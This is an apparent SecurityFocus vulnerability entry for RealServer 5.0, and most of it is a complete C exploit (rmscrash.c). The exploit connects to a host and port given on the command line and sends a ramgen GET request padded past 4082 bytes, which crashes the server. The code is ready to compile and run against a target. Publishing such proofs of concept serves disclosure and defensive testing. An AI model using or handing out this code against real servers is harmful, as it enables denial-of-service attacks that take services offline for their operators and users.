source: http://www.securityfocus.com/bid/888/info

RealServer 5.0 can be crashed by sending an overly long (4082+ bytes) ramgen request. Regular functionality can be restored by restarting the RealServer software. 

/*
 *  rmscrash.c  - bow@bow.net
 *
 *  Crash a RealMedia 5.0 server by sending a very long ramgen request. 
 *
 *  Test on:
 *         $ pnserver -v
 *         Version:        5.0-rvserver-build-290
 *         Platform: FreeBSD-2.1.x
 *
 */

#include        <stdio.h>
#include        <stdlib.h>
#include        <sys/time.h>
#include        <sys/types.h>
#include        <unistd.h>

#include        <sys/socket.h>
#include        <netinet/in.h>
#include        <netdb.h>

#define BUFLEN 4082

char    buf[BUFLEN+14];
int     sock;
struct  sockaddr_in sa;
struct  hostent *hp;

void main (int argc, char *argv[]) {
        int i, port;

        if (argc < 3) {
                printf("Usage: %s realserver port\n",argv[0]);
                exit(-1);
        }

        port = atoi(argv[2]);

        memset(buf,0x41,BUFLEN);
        memcpy(buf,"GET /ramgen/",12);
        memcpy(buf+BUFLEN," HTTP/1.1\r\n\r\n", 13);


        if ((hp=(struct hostent *)gethostbyname(argv[1]))==NULL) {
                perror("gethostbyname()");
                exit(0);
        }

        if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {
                perror("socket()");
                exit(0);
        }
        sa.sin_family=AF_INET;
        sa.sin_port=htons(port);
        memcpy((char *)&sa.sin_addr,(char *)hp->h_addr,hp->h_length);
        if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))!=0) {
                perror("connect()");
                exit(0);
        }

        printf("Connected to %s. Sending data\n",argv[1]);
        write(sock,buf,strlen(buf));
        printf("Done.\n");

        close(sock);
        exit(0);
}

